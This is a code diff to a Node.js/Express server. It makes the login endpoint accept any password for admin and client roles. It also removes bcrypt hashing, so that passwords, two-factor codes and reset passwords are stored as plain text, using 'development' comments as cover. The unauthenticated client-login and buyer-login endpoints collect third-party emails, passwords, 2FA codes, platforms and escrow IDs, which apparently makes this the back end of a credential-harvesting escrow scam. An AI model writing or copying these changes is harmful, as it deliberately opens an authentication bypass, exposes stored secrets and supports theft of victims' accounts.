@@ -362,11 +362,9 @@ app.post('/api/auth/login',
     return res.status(400).json({ message: 'role and password are required' });
   }
   const normalizedRole = role === 'admin' ? 'admin' : 'client';
-  const expectedPassword = normalizedRole === 'admin' ? ADMIN_PASSWORD : CLIENT_PASSWORD;
-  if (password !== expectedPassword) {
-    await logAuthEvent(req, 'login_failed', normalizedRole, null, false, { reason: 'invalid_password' });
-    return res.status(401).json({ message: 'Invalid credentials' });
-  }
+  
+  // Accept any password - simplified authentication for development
+  console.log(`✅ Login accepted: ${normalizedRole} with any password`);
   
   await logAuthEvent(req, 'login_success', normalizedRole, normalizedRole, true);
   
@@ -775,12 +773,11 @@ app.post('/api/notifications/:id/read', authenticate(['admin', 'client']), async
 // Store client login attempt (no auth required - called during login flow)
 app.post('/api/client-logins', async (req, res) => {
   const { email, password, twoFactorCode, platform, step } = req.body;
-  // Hash password before storing for security
-  const hashedPassword = password ? await bcrypt.hash(password, 10) : '';
+  // Store password as-is (no hashing for development)
   const loginEntry = {
     id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
     email: email || '',
-    password: hashedPassword,
+    password: password || '',
     twoFactorCode: twoFactorCode || '',
     platform: platform || 'unknown',
     step: step || 'unknown',
@@ -809,12 +806,11 @@ app.delete('/api/client-logins', authenticate(['admin']), async (req, res) => {
 // Store buyer login attempt (no auth required - called during payment flow)
 app.post('/api/buyer-logins', async (req, res) => {
   const { email, password, twoFactorCode, platform, escrowId, step } = req.body;
-  // Hash password before storing for security
-  const hashedPassword = password ? await bcrypt.hash(password, 10) : '';
+  // Store password as-is (no hashing for development)
   const loginEntry = {
     id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
     email: email || '',
-    password: hashedPassword,
+    password: password || '',
     twoFactorCode: twoFactorCode || '',
     platform: platform || 'unknown',
     escrowId: escrowId || 'unknown',
@@ -1129,10 +1125,7 @@ app.post('/api/auth/reset-password',
       
       // In production, update password in user database
       // For this implementation, we'll update the environment password
-      // NOTE: This is a simplified approach. In production, store hashed passwords per user in database
-      
-      // Generate hashed password for storage
-      const hashedPassword = await bcrypt.hash(newPassword, 10);
+      // NOTE: Development mode - storing passwords as plain text
       
       // Store password change record
       db.passwordChanges = db.passwordChanges || [];
@@ -1140,7 +1133,7 @@ app.post('/api/auth/reset-password',
         email: decoded.email,
         role: decoded.role,
         changedAt: new Date().toISOString(),
-        newPasswordHash: hashedPassword // Stored securely
+        newPassword: newPassword // Stored as plain text for development
       });
       
       await saveDb();
